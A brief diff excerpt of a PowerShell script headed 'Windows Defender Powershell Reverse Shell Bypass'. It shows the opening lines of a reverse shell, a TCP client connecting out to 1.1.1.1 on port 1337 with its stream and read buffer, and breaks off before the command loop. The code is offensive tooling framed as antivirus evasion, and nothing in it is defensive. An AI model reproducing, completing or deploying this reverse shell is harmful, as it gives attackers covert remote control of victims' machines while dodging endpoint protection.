@@ -1,3 +1,4 @@
+# Windows Defender Powershell Reverse Shell Bypass
 $amit = New-Object System.Net.Sockets.TCPClient("1.1.1.1",1337);
 $amit = $amit.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
